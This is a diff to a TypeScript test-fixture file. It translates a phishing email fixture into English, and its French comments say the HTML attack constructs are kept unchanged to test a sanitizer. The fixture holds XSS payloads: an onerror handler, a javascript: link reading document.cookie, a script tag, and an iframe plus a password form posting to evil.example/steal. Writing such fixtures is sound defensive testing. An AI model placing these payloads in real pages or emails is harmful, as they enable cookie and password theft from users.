@@ -44,8 +44,10 @@ const en: FixtureLocaleData = {
 
   phishing: {
     subject: 'Unpaid invoice — action required',
-    // Payload identique à la version française (contrat) : c'est l'attaque qui compte, pas sa langue.
-    html: '<p>Votre compte sera suspendu.</p><img src=x onerror="alert(1)"><a href="javascript:alert(document.cookie)">Payer maintenant</a><svg><script>alert(2)</script></svg><iframe src="https://evil.example/"></iframe><form action="https://evil.example/steal"><input name="password"></form><style>body{background:url("https://evil.example/p.gif")}</style><meta http-equiv="refresh" content="0;url=https://evil.example">',
+    // Seuls les textes visibles sont traduits : toutes les constructions dangereuses
+    // (onerror, javascript:, script, iframe, form, style url, meta refresh) restent
+    // identiques à la version française — c'est elles qui éprouvent l'assainisseur.
+    html: '<p>Your account will be suspended.</p><img src=x onerror="alert(1)"><a href="javascript:alert(document.cookie)">Pay now</a><svg><script>alert(2)</script></svg><iframe src="https://evil.example/"></iframe><form action="https://evil.example/steal"><input name="password"></form><style>body{background:url("https://evil.example/p.gif")}</style><meta http-equiv="refresh" content="0;url=https://evil.example">',
   },
 
   gradeReport: {
